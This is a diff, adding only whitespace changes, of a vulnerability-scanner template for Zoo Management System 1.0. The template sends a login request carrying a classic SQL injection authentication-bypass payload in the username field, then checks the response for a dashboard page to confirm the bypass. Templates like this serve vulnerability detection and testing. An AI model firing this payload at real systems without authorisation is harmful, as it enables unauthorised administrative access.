@@ -1,5 +1,4 @@
 id: zms-sqli
-
 info:
   name: Zoo Management System (ZMS) 1.0 - SQLi Authentication Bypass
   author: arafatansari
@@ -11,7 +10,6 @@ info:
   metadata:
     verified: true
   tags: zms,sqli,auth-bypass,cms
-
 requests:
   - raw:
       - |
@@ -20,7 +18,6 @@ requests:
         Content-Type: application/x-www-form-urlencoded
 
         username=admin%27+or+%271%27%3D%271&password=any&login=
-
     redirects: true
     max-redirects: 2
     matchers-condition: and
@@ -32,7 +29,6 @@ requests:
           - 'Dashboard'
           - 'Zoo Management System'
         condition: and
-
       - type: status
         status:
           - 200
